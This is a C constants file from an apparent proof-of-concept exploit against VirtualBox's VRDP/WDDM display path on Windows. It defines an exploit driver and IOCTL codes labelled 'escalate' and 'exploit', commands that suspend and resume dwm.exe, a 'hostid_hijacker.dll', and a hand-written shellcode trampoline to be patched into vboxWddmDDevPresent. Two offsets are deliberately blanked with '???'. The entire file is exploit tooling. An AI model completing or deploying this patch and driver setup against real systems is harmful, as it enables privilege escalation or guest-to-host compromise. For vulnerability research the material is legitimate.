#include <Windows.h>

/******************************************************************************
* Exploit's contants - if something not works, consider to review them
******************************************************************************/

/********** Launcher constants **********/

CHAR gDriverName[] = "vrdpexploit.sys";
CHAR gDeviceName[] = "\\??\\vrdpexploit";
DWORD gIoctlEscalate = CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS); /* 0x80002000 */
DWORD gIoctlExploit = CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS); /* 0x80002004 */

CHAR gDwmName[] = "dwm.exe";
CHAR gHijackerName[] = "hostid_hijacker.dll";
CHAR gSuspendCommand[] = "pssuspend64.exe -nobanner dwm.exe";
CHAR gResumeCommand[] = "pssuspend64.exe -nobanner -r dwm.exe";

/********** Host ID Hijacker constants **********/

CHAR launcherProcessName[] = "vrdpexploit_launcher.exe";

BYTE gPatch[] =
"\xE8\x00\x00\x00\x00"						// call $5
"\x58"										// pop rax
"\x48\x83\xE8\x05"							// sub rax, 5
"\x50"										// push rax
"\x48\xB8\x41\x41\x41\x41\x41\x41\x41\x41"	// mov rax, 0x4141414141414141
"\x50"										// push rax
"\xC3";										// ret

// Workaround to define a "constant" instead of #define PATCH_SIZE
// in several files.
enum patch_size {
	patchSize = 23,
};
enum patch_size gPatchSize = patchSize;

// Offset from gPatch to a shellcode address of command "mov rax, ..."
ULONGLONG gPatchShellcodeAddrOffset = ???; // Removed for the sake of PoC

// Offset inside vboxWddmDDevPresent where gPatch will be copied
ULONGLONG gPatchOffset = ???; // Removed for the sake of PoC

BYTE gSavedBytes[patchSize];

const DWORD gLastValidHostId = 100;

/******************************************************************************
* End of exploit's contants
******************************************************************************/
